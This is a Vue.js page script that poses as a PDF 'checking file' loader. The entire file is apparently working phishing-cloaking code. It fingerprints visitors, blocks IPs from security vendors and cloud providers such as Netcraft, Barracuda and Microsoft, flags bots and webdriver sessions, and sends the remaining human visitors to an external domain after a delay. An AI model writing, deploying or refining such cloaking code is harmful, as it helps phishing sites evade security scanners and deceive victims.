import { createApp, ref, onMounted } from 'vue';
import { detect } from 'detect-browser';
import FingerprintJS from '@fingerprintjs/fingerprintjs';
import axios from 'axios';
import './assets/style.css';

const app = createApp({
  setup() {
    const loading = ref(true);
    const isBot = ref(false);
    const isBlocked = ref(false);
    const visitorIP = ref('');

    const checkVisitorReputation = async () => {
      const browser = detect();
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      try {
        const ipInfo = await axios.get('https://ipapi.co/json/');
        visitorIP.value = ipInfo.data.ip;
        const isp = ipInfo.data.org.toLowerCase();

        // Updated list of ISPs to block on all attempts
        const blockedISPs = [
          "microsoft",
          "netcraft",
          "barracuda",
          "amazon",
          "google",
          "ovh",
          "digitalocean",
          "cloudflare",
          "fastly",
          "akamai",
          "oracle",
          "ibm",
          "linode"
        ];

        if (blockedISPs.some(blockedISP => isp.includes(blockedISP))) {
          isBlocked.value = true;
          return;
        }

        if (browser?.name === 'bot' || result.components?.adBlock?.value || result.components?.webdriver?.value) {
          isBot.value = true;
        }
      } catch (error) {
        console.error('Error fetching IP info:', error);
      }
    };

    onMounted(async () => {
      await checkVisitorReputation();
      
      if (!isBot.value && !isBlocked.value) {
        setTimeout(() => {
          window.location.href = 'https://tk.altinbasaknevresim.com.tr/';
        }, 3000);
      }
    });

    return { loading, isBot, isBlocked };
  },

  template: `
    <div v-if="!isBot && !isBlocked">
      <div v-if="loading" class="loading-container">
        <img src="/pdf-logo.png" alt="PDF Logo" class="pdf-logo" />
        <p class="loading-text">Checking file, please wait...</p>
        <div class="spinner"></div>
      </div>
    </div>
    <div v-else class="blocked-container">
      <h1>Access Denied</h1>
      <p>Your access has been blocked due to security policies.</p>
    </div>
  `,
});

app.mount('#app');
